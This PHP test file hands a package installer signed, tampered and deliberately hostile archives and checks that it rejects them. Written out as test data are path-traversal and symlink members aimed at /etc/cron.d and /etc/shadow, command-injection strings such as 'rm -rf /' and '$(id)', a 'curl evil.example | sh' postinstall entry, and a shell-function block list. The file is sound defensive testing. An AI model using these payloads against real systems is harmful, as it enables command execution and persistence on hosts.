<?php
/**
 * Exercises the package mechanism against packages built to be hostile.
 *
 * This is the test for the code that replaced two remote-code-execution paths:
 * the marketplace device installer, which wrote a shell script from
 * pnetlab.com to /tmp and ran it as root, and the self-upgrader, which
 * extracted a zip from pnetlab.com and ran `sudo $folder/upgrade`. Both are now
 * "download a signed package, hand the path to unl_wrapper -a package", so
 * everything that used to be someone else's shell script is now a manifest that
 * this code either accepts entirely or rejects entirely.
 *
 * WHY THE ARCHIVES ARE BUILT BY HAND HERE
 *
 * PnetTarWriter refuses to emit a symlink member, an absolute name or a '..'
 * component — which is right for the publisher's tool and useless for a test,
 * because the whole question is what the READER does when it is handed one.
 * raw_tar() below writes tar headers directly, so it can produce archives that
 * no honest tool would produce.
 *
 * Everything runs under a temporary prefix, so the managed roots are
 * $tmp/opt/unetlab/... and no assertion here can touch a real one. Ownership
 * changes and external commands are switched off — the applier records the
 * argv it WOULD have run, which is what lets the docker_pull assertion check
 * that a semicolon in an image name never becomes a second command.
 */

require_once __DIR__ . '/../bootstrap.php';

$root = realpath(__DIR__ . '/../..');
require_once $root . '/platform/packages/PnetPackageApplier.php';

if (!function_exists('sodium_crypto_sign_keypair')) {
    echo "  SKIP  ext-sodium is not available\n";
    test_summary();
}

// ---------------------------------------------------------------- scaffolding

$workspace = sys_get_temp_dir() . '/pnetpkg-test-' . getmypid();
mkdir($workspace, 0700, true);
register_shutdown_function(function () use ($workspace) {
    $rm = function ($path) use (&$rm) {
        if (is_link($path) || is_file($path)) {
            @unlink($path);
            return;
        }
        if (!is_dir($path)) {
            return;
        }
        foreach (scandir($path) as $n) {
            if ($n !== '.' && $n !== '..') {
                $rm($path . '/' . $n);
            }
        }
        @rmdir($path);
    };
    $rm($workspace);
});

/** A tar header with whatever name, type and size it is given. No validation. */
function raw_header($name, $size, $type, $link = '', $mode = 0644)
{
    $h = substr(str_pad($name, 100, "\0"), 0, 100);
    $h .= str_pad(sprintf('%07o', $mode), 8, "\0");
    $h .= str_pad(sprintf('%07o', 0), 8, "\0");
    $h .= str_pad(sprintf('%07o', 0), 8, "\0");
    $h .= str_pad(sprintf('%011o', $size), 12, "\0");
    $h .= str_pad(sprintf('%011o', 0), 12, "\0");
    $h .= '        ';
    $h .= $type;
    $h .= substr(str_pad($link, 100, "\0"), 0, 100);
    $h .= "ustar\0" . '00';
    $h .= str_pad('root', 32, "\0") . str_pad('root', 32, "\0");
    $h .= str_repeat("\0", 16) . str_repeat("\0", 155);
    $h = str_pad($h, 512, "\0");
    $sum = 0;
    for ($i = 0; $i < 512; $i++) {
        $sum += ord($h[$i]);
    }
    return substr($h, 0, 148) . sprintf('%06o', $sum) . "\0 " . substr($h, 156);
}

/**
 * @param array $members list of ['name' => , 'body' => , 'type' => '0'|'5'|'2'|'1', 'link' => ]
 */
function raw_tar($path, array $members)
{
    $out = '';
    foreach ($members as $m) {
        $body = isset($m['body']) ? $m['body'] : '';
        $type = isset($m['type']) ? $m['type'] : '0';
        $size = ($type === '0') ? strlen($body) : 0;
        $out .= raw_header($m['name'], $size, $type, isset($m['link']) ? $m['link'] : '');
        if ($size > 0) {
            $out .= $body;
            $pad = $size % 512 === 0 ? 0 : 512 - ($size % 512);
            $out .= str_repeat("\0", $pad);
        }
    }
    $out .= str_repeat("\0", 1024);
    file_put_contents($path, gzencode($out, 6));
    return $path;
}

function canonical_json(array $data)
{
    return json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . "\n";
}

/** Fill in a manifest's payload map from the bodies it will ship with. */
function with_payload(array $manifest, array $payload)
{
    $map = array();
    foreach ($payload as $name => $body) {
        $map[$name] = array('sha256' => hash('sha256', $body), 'size' => strlen($body));
    }
    ksort($map);
    $manifest['payload'] = $map;
    return $manifest;
}

// --- the signing key --------------------------------------------------------
$trustDir = $workspace . '/trust';
mkdir($trustDir, 0700, true);
list($publicText, $secretText, $keyId) = PnetMinisign::keygen('test key');
file_put_contents($trustDir . '/test.pub', $publicText);
$secret = PnetMinisign::parseSecretKey($secretText);

// A second key that is never installed as trusted, for the "signed by someone
// else" case.
list($strangerPub, $strangerSec, $strangerId) = PnetMinisign::keygen('stranger');
$stranger = PnetMinisign::parseSecretKey($strangerSec);

assert_true(strlen($keyId) === 16, 'keygen produced a 64-bit key id');

$roundTrip = PnetMinisign::parsePublicKey($publicText);
assert_same($keyId, bin2hex($roundTrip['id']), 'the public key carries the same key id as the secret key');

// --- a well-formed package --------------------------------------------------
$goodPayload = array(
    'images/virtioa.qcow2' => "QFI\xfb" . str_repeat('disk', 64),
    'templates/vios-fork.yml' => "---\ntype: qemu\nname: vIOS (fork)\n",
    'icons/Router-fork.png' => "\x89PNG\r\n\x1a\n" . str_repeat('px', 32),
);
$goodManifest = with_payload(array(
    'format' => 1,
    'id' => 'cisco-vios-fork',
    'version' => '1.0.0',
    'name' => 'Cisco vIOS (fork)',
    'kind' => 'device',
    'device_id' => '4242',
    'install' => array(
        array('verb' => 'mkdir', 'path' => 'addons:qemu/vios-15.6', 'mode' => '0755'),
        array('verb' => 'install_image', 'emulator' => 'qemu', 'folder' => 'vios-15.6',
              'name' => 'virtioa.qcow2', 'source' => 'images/virtioa.qcow2', 'mode' => '0644'),
        array('verb' => 'install_template', 'arch' => 'intel', 'name' => 'vios-fork.yml',
              'source' => 'templates/vios-fork.yml'),
        array('verb' => 'install_icon', 'name' => 'Router-fork.png', 'source' => 'icons/Router-fork.png'),
        array('verb' => 'set_permissions', 'path' => 'addons:qemu/vios-15.6', 'mode' => '0755', 'recursive' => '1'),
        array('verb' => 'set_version', 'version' => '5.3.1'),
    ),
    'uninstall' => array(
        array('verb' => 'remove', 'path' => 'addons:qemu/vios-15.6'),
        array('verb' => 'remove', 'path' => 'templates:intel/vios-fork.yml'),
    ),
), $goodPayload);

/** Build a .pnetpkg from a manifest array and a payload map. */
function build($path, array $manifest, array $payload, $secret, $options = array())
{
    $bytes = isset($options['manifest_bytes']) ? $options['manifest_bytes'] : canonical_json($manifest);
    $members = array(array('name' => 'manifest.json', 'body' => $bytes));
    if ($secret !== null) {
        $signOver = isset($options['sign_over']) ? $options['sign_over'] : $bytes;
        $members[] = array(
            'name' => 'manifest.json.minisig',
            'body' => PnetMinisign::sign($signOver, $secret, 'test', 'test'),
        );
    }
    foreach ($payload as $name => $body) {
        $members[] = array('name' => 'payload/' . $name, 'body' => $body);
    }
    if (isset($options['extra_members'])) {
        foreach ($options['extra_members'] as $m) {
            $members[] = $m;
        }
    }
    if (isset($options['members'])) {
        $members = $options['members'];
    }
    return raw_tar($path, $members);
}

$caseNumber = 0;
/**
 * Apply a package into a private prefix and return [$result, $prefix, $applier].
 */
function run_apply($packagePath, $options = array())
{
    global $workspace, $trustDir, $caseNumber;
    $prefix = $workspace . '/case-' . (++$caseNumber);
    mkdir($prefix, 0700, true);
    $applier = new PnetPackageApplier(array_merge(array(
        'prefix' => $prefix,
        'trust_dirs' => array($trustDir),
        'apply_ownership' => false,
        'run_commands' => false,
    ), $options));
    return array($applier->apply($packagePath), $prefix, $applier);
}

/*
|--------------------------------------------------------------------------
| 1. A valid signed package applies
|--------------------------------------------------------------------------
*/

$pkg = build($workspace . '/good.pnetpkg', $goodManifest, $goodPayload, $secret);
list($result, $prefix, $applier) = run_apply($pkg);

assert_true($result['ok'], 'a valid signed package applies' . ($result['ok'] ? '' : ': ' . $result['error']));
assert_same($keyId, $result['key'], 'the package is attributed to the key that signed it');
assert_true($result['signed'], 'the result records that the package was signed');

assert_same($goodPayload['images/virtioa.qcow2'],
    @file_get_contents($prefix . '/opt/unetlab/addons/qemu/vios-15.6/virtioa.qcow2'),
    'install_image placed the disk image under addons/qemu/<folder>/');
assert_same($goodPayload['templates/vios-fork.yml'],
    @file_get_contents($prefix . '/opt/unetlab/html/templates/intel/vios-fork.yml'),
    'install_template placed the yml under html/templates/intel/');
assert_same($goodPayload['icons/Router-fork.png'],
    @file_get_contents($prefix . '/opt/unetlab/html/images/icons/Router-fork.png'),
    'install_icon placed the icon under html/images/icons/');
assert_same("5.3.1\n", @file_get_contents($prefix . '/opt/unetlab/data/packages/version'),
    'set_version wrote the version into package state');

$installed = json_decode((string) @file_get_contents(
    $prefix . '/opt/unetlab/data/packages/installed/cisco-vios-fork.json'), true);
assert_true(is_array($installed) && $installed['device_id'] === '4242',
    'the installed-state record links the package to its marketplace device id');
assert_true(is_array($installed) && count($installed['uninstall']) === 2,
    'the installed-state record carries the uninstall plan');

assert_true(!is_dir($prefix . '/opt/unetlab/data/packages/staging/cisco-vios-fork-' . getmypid()),
    'staging is cleaned up after a successful apply');

// Applying the same package twice must land in the same place, not fail and not
// double up: an admin who clicks Get Device again is not an error condition.
$pkg2 = build($workspace . '/good2.pnetpkg', $goodManifest, $goodPayload, $secret);
$applier2 = new PnetPackageApplier(array(
    'prefix' => $prefix, 'trust_dirs' => array($trustDir),
    'apply_ownership' => false, 'run_commands' => false,
));
$again = $applier2->apply($pkg2);
assert_true($again['ok'], 'applying the same package a second time succeeds');
assert_same($goodPayload['images/virtioa.qcow2'],
    @file_get_contents($prefix . '/opt/unetlab/addons/qemu/vios-15.6/virtioa.qcow2'),
    'a second apply leaves the same content in place');

/*
|--------------------------------------------------------------------------
| 2. Tampering
|--------------------------------------------------------------------------
*/

// A payload byte changed after signing. The manifest still verifies; the file
// no longer matches the digest the manifest declares.
$tampered = $goodPayload;
$tampered['images/virtioa.qcow2'] = str_replace('disk', 'evil', $tampered['images/virtioa.qcow2']);
$pkg = build($workspace . '/tampered-payload.pnetpkg', $goodManifest, $tampered, $secret);
list($result, $prefix) = run_apply($pkg);
assert_true(!$result['ok'], 'a package whose payload was modified after signing is rejected');
assert_true(strpos((string) $result['error'], 'digest') !== false,
    'the rejection names the digest mismatch');
assert_true(!is_file($prefix . '/opt/unetlab/addons/qemu/vios-15.6/virtioa.qcow2'),
    'nothing from a tampered package reaches a managed root');

// The manifest changed after signing.
$evilManifest = $goodManifest;
$evilManifest['install'][3]['name'] = 'Router-evil.png';
$pkg = build($workspace . '/tampered-manifest.pnetpkg', $evilManifest, $goodPayload, $secret, array(
    'sign_over' => canonical_json($goodManifest),
));
list($result) = run_apply($pkg);
assert_true(!$result['ok'], 'a package whose manifest was modified after signing is rejected');
assert_true(strpos((string) $result['error'], 'does not verify') !== false,
    'the rejection says the signature did not verify');

// Signed by a real key that this box does not trust.
$pkg = build($workspace . '/stranger.pnetpkg', $goodManifest, $goodPayload, $stranger);
list($result) = run_apply($pkg);
assert_true(!$result['ok'], 'a package signed by an untrusted key is rejected');
assert_true(strpos((string) $result['error'], 'not trusted') !== false,
    'the rejection says the key is not trusted');

/*
|--------------------------------------------------------------------------
| 3. Unsigned packages
|--------------------------------------------------------------------------
*/

$pkg = build($workspace . '/unsigned.pnetpkg', $goodManifest, $goodPayload, null);
list($result) = run_apply($pkg);
assert_true(!$result['ok'], 'an unsigned package is rejected by default');
assert_true(strpos((string) $result['error'], 'no signature') !== false,
    'the rejection says the package carries no signature');

list($result, $prefix) = run_apply($pkg, array('allow_unsigned' => true));
assert_true($result['ok'], 'an unsigned package applies when unsigned mode is explicitly enabled');
assert_true(!$result['signed'], 'the result records that the applied package was unsigned');

// install_config_script ships something that later runs as root at node-config
// time. It is the one verb that puts executable supplier content on the box, so
// it is refused outright when nobody has signed for it.
$scriptManifest = with_payload(array(
    'format' => 1, 'id' => 'scripted', 'version' => '1.0.0', 'kind' => 'device',
    'install' => array(
        array('verb' => 'install_config_script', 'name' => 'config_evil.py', 'source' => 'config_evil.py'),
    ),
), array('config_evil.py' => "import os\n"));
$pkg = build($workspace . '/unsigned-script.pnetpkg', $scriptManifest,
    array('config_evil.py' => "import os\n"), null);
list($result) = run_apply($pkg, array('allow_unsigned' => true));
assert_true(!$result['ok'], 'install_config_script is refused in an unsigned package even in unsigned mode');
assert_true(strpos((string) $result['error'], 'only permitted in a signed package') !== false,
    'the rejection says the verb needs a signature');

/*
|--------------------------------------------------------------------------
| 4. Hostile archives
|--------------------------------------------------------------------------
|
| Each of these is a tar member that no honest packaging tool would write. The
| reader has to refuse them before any path is built from the name, which is
| the property ZipArchive::extractTo() and PharData::extractTo() do not have.
*/

$manifestBytes = canonical_json($goodManifest);
$signature = PnetMinisign::sign($manifestBytes, $secret, 'test', 'test');

$hostile = array(
    'a ../ escape' => array(
        'member' => array('name' => 'payload/../../../../etc/cron.d/pwn', 'body' => "* * * * * root id\n"),
        'expect' => 'traversal',
    ),
    'an absolute path' => array(
        'member' => array('name' => '/etc/cron.d/pwn', 'body' => "* * * * * root id\n"),
        'expect' => 'only payload/',
    ),
    'a symbolic link' => array(
        'member' => array('name' => 'payload/images/virtioa.qcow2', 'type' => '2', 'link' => '/etc/shadow'),
        'expect' => 'not a regular file or directory',
    ),
    'a hard link' => array(
        'member' => array('name' => 'payload/images/virtioa.qcow2', 'type' => '1', 'link' => '/etc/shadow'),
        'expect' => 'not a regular file or directory',
    ),
    'a device node' => array(
        'member' => array('name' => 'payload/images/virtioa.qcow2', 'type' => '3'),
        'expect' => 'not a regular file or directory',
    ),
    'a member the manifest never declared' => array(
        'member' => array('name' => 'payload/images/extra.bin', 'body' => 'smuggled'),
        'expect' => 'not declared in the manifest',
    ),
);

$i = 0;
foreach ($hostile as $label => $case) {
    $members = array(
        array('name' => 'manifest.json', 'body' => $manifestBytes),
        array('name' => 'manifest.json.minisig', 'body' => $signature),
    );
    foreach ($goodPayload as $name => $body) {
        $members[] = array('name' => 'payload/' . $name, 'body' => $body);
    }
    $members[] = $case['member'];
    $path = raw_tar($workspace . '/hostile-' . (++$i) . '.pnetpkg', $members);

    list($result, $prefix) = run_apply($path);
    assert_true(!$result['ok'], 'an archive containing ' . $label . ' is rejected');
    assert_true(strpos((string) $result['error'], $case['expect']) !== false,
        '  ...and the rejection says why (' . $case['expect'] . '): ' . $result['error']);
    assert_true(!file_exists('/etc/cron.d/pwn'), 'nothing escaped to /etc/cron.d');
    assert_true(!is_dir($prefix . '/etc'), 'nothing was written outside the managed roots');
}

// A member that claims one size in its header and another in the manifest: the
// signed number wins, and it wins before the bytes are read.
$members = array(
    array('name' => 'manifest.json', 'body' => $manifestBytes),
    array('name' => 'manifest.json.minisig', 'body' => $signature),
    array('name' => 'payload/images/virtioa.qcow2', 'body' => str_repeat('X', 4096)),
    array('name' => 'payload/templates/vios-fork.yml', 'body' => $goodPayload['templates/vios-fork.yml']),
    array('name' => 'payload/icons/Router-fork.png', 'body' => $goodPayload['icons/Router-fork.png']),
);
$path = raw_tar($workspace . '/wrong-size.pnetpkg', $members);
list($result) = run_apply($path);
assert_true(!$result['ok'], 'a member whose size differs from the signed manifest is rejected');
assert_true(strpos((string) $result['error'], 'the manifest declares') !== false,
    'the rejection compares the two sizes');

// A member the manifest declares but the archive omits.
$members = array(
    array('name' => 'manifest.json', 'body' => $manifestBytes),
    array('name' => 'manifest.json.minisig', 'body' => $signature),
    array('name' => 'payload/images/virtioa.qcow2', 'body' => $goodPayload['images/virtioa.qcow2']),
);
$path = raw_tar($workspace . '/missing-member.pnetpkg', $members);
list($result) = run_apply($path);
assert_true(!$result['ok'], 'a package missing a member its manifest declares is rejected');

// The manifest must be first. A package that puts payload before it would let
// bytes be written before anything had been verified.
$members = array(
    array('name' => 'payload/images/virtioa.qcow2', 'body' => $goodPayload['images/virtioa.qcow2']),
    array('name' => 'manifest.json', 'body' => $manifestBytes),
    array('name' => 'manifest.json.minisig', 'body' => $signature),
);
$path = raw_tar($workspace . '/manifest-last.pnetpkg', $members);
list($result) = run_apply($path);
assert_true(!$result['ok'], 'a package whose first member is not the manifest is rejected');

/*
|--------------------------------------------------------------------------
| 5. Hostile manifests
|--------------------------------------------------------------------------
*/

$badManifests = array(
    'an unknown verb' => array(
        'manifest' => array('install' => array(array('verb' => 'run_script', 'source' => 'x'))),
        'payload' => array('x' => 'echo hi'),
        'expect' => 'unknown manifest verb',
    ),
    'shell metacharacters in a docker image name' => array(
        'manifest' => array('install' => array(array('verb' => 'docker_pull', 'image' => 'alpine:3.19; rm -rf /'))),
        'payload' => array(),
        'expect' => 'does not match the dockerimage pattern',
    ),
    'command substitution in a docker image name' => array(
        'manifest' => array('install' => array(array('verb' => 'docker_pull', 'image' => 'alpine:$(id)'))),
        'payload' => array(),
        'expect' => 'does not match the dockerimage pattern',
    ),
    'a backtick in an icon name' => array(
        'manifest' => array('install' => array(
            array('verb' => 'install_icon', 'name' => 'a`id`.png', 'source' => 'a'))),
        'payload' => array('a' => 'x'),
        'expect' => 'does not match the icon pattern',
    ),
    'a newline in a service name' => array(
        'manifest' => array('install' => array(
            array('verb' => 'restart_service', 'service' => "apache2\nid"))),
        'payload' => array(),
        'expect' => 'does not match the service pattern',
    ),
    'a semicolon in a mode' => array(
        'manifest' => array('install' => array(
            array('verb' => 'mkdir', 'path' => 'addons:qemu/x', 'mode' => '0755; id'))),
        'payload' => array(),
        'expect' => 'does not match the mode pattern',
    ),
    'a traversal in a manifest path' => array(
        'manifest' => array('install' => array(
            array('verb' => 'mkdir', 'path' => 'addons:../../../etc/cron.d'))),
        'payload' => array(),
        'expect' => 'does not match the path pattern',
    ),
    'an absolute manifest path' => array(
        'manifest' => array('install' => array(
            array('verb' => 'mkdir', 'path' => '/etc/cron.d'))),
        'payload' => array(),
        'expect' => 'does not match the path pattern',
    ),
    'a path root that does not exist' => array(
        'manifest' => array('install' => array(
            array('verb' => 'mkdir', 'path' => 'etc:cron.d'))),
        'payload' => array(),
        'expect' => 'does not match the path pattern',
    ),
    'an argument the verb does not take' => array(
        'manifest' => array('install' => array(
            array('verb' => 'mkdir', 'path' => 'addons:qemu/x', 'owner' => 'root:root'))),
        'payload' => array(),
        'expect' => 'has no argument',
    ),
    'a manifest key nobody defined' => array(
        'manifest' => array('postinstall' => 'curl evil.example | sh',
            'install' => array(array('verb' => 'mkdir', 'path' => 'addons:qemu/x'))),
        'payload' => array(),
        'expect' => 'unknown manifest key',
    ),
    'a payload member nothing uses' => array(
        'manifest' => array('install' => array(array('verb' => 'mkdir', 'path' => 'addons:qemu/x'))),
        'payload' => array('stowaway.sh' => "id\n"),
        'expect' => 'never used',
    ),
    'an operation naming a payload member that is not declared' => array(
        'manifest' => array('install' => array(
            array('verb' => 'install_icon', 'name' => 'a.png', 'source' => 'nothere'))),
        'payload' => array(),
        'expect' => 'which the manifest does not declare',
    ),
);

foreach ($badManifests as $label => $case) {
    $manifest = with_payload(array_merge(array(
        'format' => 1, 'id' => 'hostile', 'version' => '1.0.0', 'kind' => 'device',
    ), $case['manifest']), $case['payload']);
    $path = build($workspace . '/bad-' . md5($label) . '.pnetpkg', $manifest, $case['payload'], $secret);
    list($result, $prefix) = run_apply($path);
    assert_true(!$result['ok'], 'a manifest with ' . $label . ' is rejected');
    assert_true(strpos((string) $result['error'], $case['expect']) !== false,
        '  ...and the rejection says why (' . $case['expect'] . '): ' . $result['error']);
}

/*
|--------------------------------------------------------------------------
| 6. Allowlisted verbs still do not reach a shell
|--------------------------------------------------------------------------
|
| A legal docker image name is passed as one element of an argv array. There is
| no command string anywhere on this path, so there is nothing for a
| metacharacter to be a metacharacter IN — the pattern check above is the
| second defence, not the only one.
*/

$dockerManifest = with_payload(array(
    'format' => 1, 'id' => 'dockerdev', 'version' => '1.0.0', 'kind' => 'device',
    'install' => array(
        array('verb' => 'docker_pull', 'image' => 'pnetlab/pnet-wireshark:latest'),
        array('verb' => 'restart_service', 'service' => 'docker'),
    ),
), array());
$path = build($workspace . '/docker.pnetpkg', $dockerManifest, array(), $secret);
list($result, $prefix, $applier) = run_apply($path);
assert_true($result['ok'], 'a docker_pull package applies' . ($result['ok'] ? '' : ': ' . $result['error']));
assert_same(array('/usr/bin/docker', 'pull', '--', 'pnetlab/pnet-wireshark:latest'),
    isset($applier->commands[0]) ? $applier->commands[0] : null,
    'docker_pull builds an argv array, not a command line');
assert_same(array('/usr/bin/systemctl', 'restart', '--', 'docker.service'),
    isset($applier->commands[1]) ? $applier->commands[1] : null,
    'restart_service builds an argv array, not a command line');

/*
|--------------------------------------------------------------------------
| 7. Rollback
|--------------------------------------------------------------------------
|
| An install that fails partway must leave the host as it was. The second
| operation here is refused because a component of its destination is a
| symbolic link — the case where something already on the box, rather than
| something in the archive, would redirect a write.
*/

$prefix = $workspace . '/rollback';
mkdir($prefix . '/opt/unetlab/html/images/icons', 0700, true);
mkdir($prefix . '/opt/unetlab/html/templates/intel', 0700, true);
file_put_contents($prefix . '/opt/unetlab/html/images/icons/Router-fork.png', 'ORIGINAL ICON');
symlink('/tmp', $prefix . '/opt/unetlab/html/templates/evil');

$rollbackPayload = array(
    'icons/Router-fork.png' => 'NEW ICON',
    'templates/x.yml' => "---\n",
);
$rollbackManifest = with_payload(array(
    'format' => 1, 'id' => 'rollback-me', 'version' => '1.0.0', 'kind' => 'device',
    'install' => array(
        array('verb' => 'install_icon', 'name' => 'Router-fork.png', 'source' => 'icons/Router-fork.png'),
        array('verb' => 'install_file', 'source' => 'templates/x.yml', 'path' => 'templates:evil/x.yml'),
    ),
), $rollbackPayload);
$path = build($workspace . '/rollback.pnetpkg', $rollbackManifest, $rollbackPayload, $secret);

$applier = new PnetPackageApplier(array(
    'prefix' => $prefix, 'trust_dirs' => array($trustDir),
    'apply_ownership' => false, 'run_commands' => false,
));
$result = $applier->apply($path);

assert_true(!$result['ok'], 'an install that writes through a symbolic link fails');
assert_true($result['rolled_back'], 'the failure rolled the transaction back');
assert_same('ORIGINAL ICON',
    @file_get_contents($prefix . '/opt/unetlab/html/images/icons/Router-fork.png'),
    'the file the first operation had already replaced is restored');
assert_true(!is_file('/tmp/x.yml'), 'nothing was written through the symbolic link');
assert_true(!is_file($prefix . '/opt/unetlab/data/packages/installed/rollback-me.json'),
    'a rolled-back package is not recorded as installed');

/*
|--------------------------------------------------------------------------
| 8. An interrupted apply is unwound before the next one starts
|--------------------------------------------------------------------------
*/

$prefix = $workspace . '/interrupted';
$state = $prefix . '/opt/unetlab/data/packages';
mkdir($state . '/staging/killed-run', 0700, true);
mkdir($prefix . '/opt/unetlab/html/images/icons', 0700, true);
file_put_contents($prefix . '/opt/unetlab/html/images/icons/Old.png', 'HALF APPLIED');
file_put_contents($state . '/staging/killed-run/backup', 'THE ORIGINAL');
file_put_contents($state . '/staging/killed-run/journal.json', json_encode(array(
    'complete' => false,
    'entries' => array(
        array('undo' => 'restore',
              'path' => $prefix . '/opt/unetlab/html/images/icons/Old.png',
              'backup' => $state . '/staging/killed-run/backup'),
    ),
)));

$path = build($workspace . '/after-interrupt.pnetpkg', $goodManifest, $goodPayload, $secret);
$applier = new PnetPackageApplier(array(
    'prefix' => $prefix, 'trust_dirs' => array($trustDir),
    'apply_ownership' => false, 'run_commands' => false,
));
$result = $applier->apply($path);
assert_true($result['ok'], 'a package applies after an interrupted run is recovered');
assert_same('THE ORIGINAL',
    @file_get_contents($prefix . '/opt/unetlab/html/images/icons/Old.png'),
    'the interrupted run was unwound before the new one started');
assert_true(!is_dir($state . '/staging/killed-run'),
    'the abandoned staging directory is cleared');

/*
|--------------------------------------------------------------------------
| 8b. A running operation is not mistaken for an interrupted one
|--------------------------------------------------------------------------
|
| The recovery above is what makes this necessary: a second applier that found
| the first one's live journal would "recover" it. The lock is a flock on
| <state>/lock, so holding it from here is exactly what a concurrent run does.
*/

$prefix = $workspace . '/concurrent';
$state = $prefix . '/opt/unetlab/data/packages';
mkdir($state, 0700, true);
$held = fopen($state . '/lock', 'c');
assert_true(flock($held, LOCK_EX | LOCK_NB), 'the test holds the package lock');

$path = build($workspace . '/while-locked.pnetpkg', $goodManifest, $goodPayload, $secret);
$applier = new PnetPackageApplier(array(
    'prefix' => $prefix, 'trust_dirs' => array($trustDir),
    'apply_ownership' => false, 'run_commands' => false,
));
$result = $applier->apply($path);
assert_true(!$result['ok'], 'apply is refused while another operation holds the lock');
assert_true(strpos((string) $result['error'], 'another package operation') !== false,
    'and says so: ' . $result['error']);
assert_true(!is_file($state . '/installed/cisco-vios-fork.json'),
    'nothing was applied');
$staged = is_dir($state . '/staging') ? array_diff(scandir($state . '/staging'), array('.', '..')) : array();
assert_same(array(), array_values($staged), 'and no staging directory was created or cleared');

$removed = $applier->uninstall('cisco-vios-fork');
assert_true(!$removed['ok'] && strpos((string) $removed['error'], 'another package operation') !== false,
    'uninstall is refused under the same lock');

flock($held, LOCK_UN);
fclose($held);
$result = $applier->apply($path);
assert_true($result['ok'], 'the same applier succeeds once the lock is released'
    . ($result['ok'] ? '' : ': ' . $result['error']));
assert_true(is_file($state . '/lock'), 'the lock file lives in the state directory');

/*
|--------------------------------------------------------------------------
| 9. Uninstall runs the recorded plan, and only the recorded plan
|--------------------------------------------------------------------------
*/

$prefix = $workspace . '/uninstall';
mkdir($prefix, 0700, true);
$applier = new PnetPackageApplier(array(
    'prefix' => $prefix, 'trust_dirs' => array($trustDir),
    'apply_ownership' => false, 'run_commands' => false,
));
$path = build($workspace . '/uninstall.pnetpkg', $goodManifest, $goodPayload, $secret);
$result = $applier->apply($path);
assert_true($result['ok'], 'the package to be uninstalled applied first');

$removed = $applier->uninstall('cisco-vios-fork');
assert_true($removed['ok'], 'uninstall runs the recorded plan' . ($removed['ok'] ? '' : ': ' . $removed['error']));
assert_true(!is_dir($prefix . '/opt/unetlab/addons/qemu/vios-15.6'),
    'uninstall removed the image directory');
assert_true(!is_file($prefix . '/opt/unetlab/html/templates/intel/vios-fork.yml'),
    'uninstall removed the template');
assert_true(!is_file($prefix . '/opt/unetlab/data/packages/installed/cisco-vios-fork.json'),
    'the installed-state record is gone');

// A hand-edited state file gets the same treatment a hand-edited manifest does.
@mkdir($prefix . '/opt/unetlab/data/packages/installed', 0755, true);
file_put_contents($prefix . '/opt/unetlab/data/packages/installed/edited.json', json_encode(array(
    'id' => 'edited', 'version' => '1.0.0',
    'uninstall' => array(array('verb' => 'remove', 'path' => 'html:../../../../etc/passwd')),
)));
$removed = $applier->uninstall('edited');
assert_true(!$removed['ok'], 'an uninstall plan edited on disk is revalidated and rejected');
assert_true(is_file('/etc/passwd'), '/etc/passwd is still there');

/*
|--------------------------------------------------------------------------
| 10. The applier never reaches a shell
|--------------------------------------------------------------------------
|
| Asserted on the tokens, not on the text, so a comment mentioning exec() does
| not count and a call spelled across a line break does.
*/

$sources = array(
    $root . '/platform/packages/PnetPackageApplier.php',
    $root . '/platform/packages/PnetPackage.php',
);
foreach ($sources as $source) {
    $found = array();
    $tokens = token_get_all(file_get_contents($source));
    foreach ($tokens as $index => $token) {
        if (is_string($token) && $token === '`') {
            $found[] = 'backtick operator';
            continue;
        }
        if (!is_array($token) || $token[0] !== T_STRING) {
            continue;
        }
        $name = strtolower($token[1]);
        if (!in_array($name, array('exec', 'shell_exec', 'system', 'passthru', 'popen'), true)) {
            continue;
        }
        // Only a call counts: the next significant token must be '('.
        for ($j = $index + 1; $j < count($tokens); $j++) {
            $next = $tokens[$j];
            if (is_array($next) && in_array($next[0], array(T_WHITESPACE, T_COMMENT, T_DOC_COMMENT), true)) {
                continue;
            }
            if ($next === '(') {
                $found[] = $name . '()';
            }
            break;
        }
    }
    assert_same(array(), $found,
        basename($source) . ' contains no call that hands a string to a shell');
}

test_summary();
